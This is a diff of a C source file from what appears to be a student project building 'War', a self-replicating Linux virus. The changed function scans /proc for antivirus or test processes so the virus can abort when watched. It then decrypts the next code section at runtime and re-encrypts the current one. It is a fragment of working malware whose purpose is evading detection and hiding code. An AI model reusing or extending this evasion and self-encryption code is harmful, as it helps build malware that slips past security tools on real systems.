@@ -6,14 +6,27 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/04 11:45:59 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 15:40:30 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
+/*
+  Opening() iterate thought every entry in /proc in order to found antivirus proccess
+  Look at needle variable to remove or add proccess you want to find.
+  if the process is found then War abort as soon as possible.
+*/
+
 void	opening(t_data *data)
 {
+
+#ifdef DEBUG
+	char de[] = "opening\t0\n";
+	data->context == true ?	de[8] = 49 : 0;
+	_write(1, de, _strlen(de));
+#endif
+
 	int				fd[3];
 	int				limit;
 	char			buf[BUFF_SIZE] = {0};
@@ -23,15 +36,9 @@ void	opening(t_data *data)
 	char			needle[PROG_ENTRY][16] = { "sleep", "antivirus", "test" };
 	linux_dirent64	*curr = NULL;
 
-# ifdef DEBUG
-	char de[] = "opening\t \n";
-	data->context == true ?	de[8] = 49 : 48;
-	_write(1, de, _strlen(de));
-#endif
-
 	data->context = false;
 	if ((fd[0] = _open(path, O_RDONLY, 0000)) < 0)
-		goto ERR;
+		goto next;
 
 	while ((limit = _getdents64(fd[0], (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
 	{
@@ -47,13 +54,13 @@ void	opening(t_data *data)
 				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
 				{
 					_close(fd[0]);
-					goto ERR;
+					goto next;
 				}
 				_memcpy(path + (6 + len), target, 9);
 				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
 				{
 					_close(fd[1]);
-					goto ERR;
+					goto next;
 				}
 
 				if (_read(fd[2], prog, PROG_INFO) > 0)
@@ -67,7 +74,7 @@ void	opening(t_data *data)
 						{
 							_close(fd[2]);
 							_close(fd[1]);
-							goto ERR;
+							goto next;
 						}
 					}
 				}
@@ -80,10 +87,9 @@ void	opening(t_data *data)
 	_close(fd[0]);
 	data->context = true;
 
-ERR:
+next:
 
 	update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening);
 	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
-
 	war(data);
 }
